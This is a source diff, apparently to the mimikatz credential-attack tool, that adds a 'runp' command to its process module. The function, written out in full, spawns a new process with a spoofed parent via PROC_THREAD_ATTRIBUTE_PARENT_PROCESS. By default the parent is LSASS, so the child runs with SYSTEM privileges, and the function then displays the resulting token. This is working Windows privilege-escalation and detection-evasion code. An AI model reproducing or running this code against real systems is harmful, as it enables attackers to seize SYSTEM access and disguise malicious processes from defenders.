@@ -14,6 +14,7 @@ const KUHL_M_C kuhl_m_c_process[] = {
 	{kuhl_m_process_suspend,	L"suspend",		L"Suspend a process"},
 	{kuhl_m_process_resume,		L"resume",		L"Resume a process"},
 	{kuhl_m_process_run,		L"run",			L"Run!"},
+	{kuhl_m_process_runParent,	L"runp",		L""},
 };
 
 const KUHL_M kuhl_m_process = {
@@ -270,6 +271,87 @@ NTSTATUS kuhl_m_process_run(int argc, wchar_t * argv[])
 		commandLine = argv[argc - 1];
 		kprintf(L"Trying to start \"%s\"...\n", commandLine);
 		kull_m_process_run_data(commandLine, NULL);
+	}
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS kuhl_m_process_runParent(int argc, wchar_t * argv[])
+{
+	HMODULE hModule;
+	HANDLE hProcess, hToken;
+	STARTUPINFOEX si;
+	PROCESS_INFORMATION pi;
+	SIZE_T size;
+	PINITIALIZEPROCTHREADATTRIBUTELIST pInit;
+	PUPDATEPROCTHREADATTRIBUTE pUpdate;
+	PDELETEPROCTHREADATTRIBUTELIST pDel;
+	LPCWCHAR szRun, szPid;
+	PWCHAR szDupRun;
+	DWORD pid;
+
+	RtlZeroMemory(&si, sizeof(STARTUPINFOEX));
+	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
+#pragma warning(push)
+#pragma warning(disable:4996)
+	kull_m_string_args_byName(argc, argv, L"run", &szRun, _wpgmptr);
+#pragma warning(pop)
+	if(kull_m_string_args_byName(argc, argv, L"ppid", &szPid, NULL) || kull_m_string_args_byName(argc, argv, L"pid", &szPid, NULL))
+		pid = wcstoul(szPid, NULL, 0);
+	else
+	{
+		kprintf(L"[pid] no argument, default for LSASS\n");
+		if(!kull_m_process_getProcessIdForName(L"lsass.exe", &pid))
+			PRINT_ERROR(L"Unable to find LSASS\n");
+	}
+
+	if(kull_m_string_copy(&szDupRun, szRun))
+	{
+		kprintf(L"Run : %s\nPPID: %u\n", szDupRun, pid);
+		if(hModule = GetModuleHandle(L"kernel32.dll"))
+		{
+			pInit = (PINITIALIZEPROCTHREADATTRIBUTELIST) GetProcAddress(hModule, "InitializeProcThreadAttributeList"); // because you know, xp/2003...
+			pUpdate = (PUPDATEPROCTHREADATTRIBUTE) GetProcAddress(hModule, "UpdateProcThreadAttribute");
+			pDel = (PDELETEPROCTHREADATTRIBUTELIST) GetProcAddress(hModule, "DeleteProcThreadAttributeList"); 
+			if(pInit && pUpdate && pDel)
+			{
+				if(hProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pid))
+				{
+					if(!pInit(NULL, 1, 0, &size) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER))
+					{
+						if(si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST) LocalAlloc(LPTR, size))
+						{
+							if(pInit(si.lpAttributeList, 1, 0, &size))
+							{
+								if(pUpdate(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL))
+								{
+									if(CreateProcess(NULL, szDupRun, NULL,  NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,  NULL, NULL, (LPSTARTUPINFO) &si, &pi))
+									{
+										kprintf(L"PID: %u - TID: %u\n", pi.dwProcessId, pi.dwThreadId);
+										if(OpenProcessToken(pi.hProcess, TOKEN_QUERY, &hToken))
+										{
+											kuhl_m_token_displayAccount(hToken, kull_m_string_args_byName(argc, argv, L"token", NULL, NULL));
+											CloseHandle(hToken);
+										}
+										CloseHandle(pi.hThread);
+										CloseHandle(pi.hProcess);
+									}
+									else PRINT_ERROR_AUTO(L"CreateProcess");
+								}
+								else PRINT_ERROR_AUTO(L"pUpdate");
+								pDel(si.lpAttributeList);
+							}
+							else PRINT_ERROR_AUTO(L"pInit(data)");
+							LocalFree(si.lpAttributeList);
+						}
+					}
+					else PRINT_ERROR_AUTO(L"pInit(init)");
+					CloseHandle(hProcess);
+				}
+				else PRINT_ERROR_AUTO(L"OpenProcess");
+			}
+			else PRINT_ERROR(L"Unable to get function pointers: pInit %p ; pUpdate %p ; pDel %p\n");
+		}
+		LocalFree(szDupRun);
 	}
 	return STATUS_SUCCESS;
 }
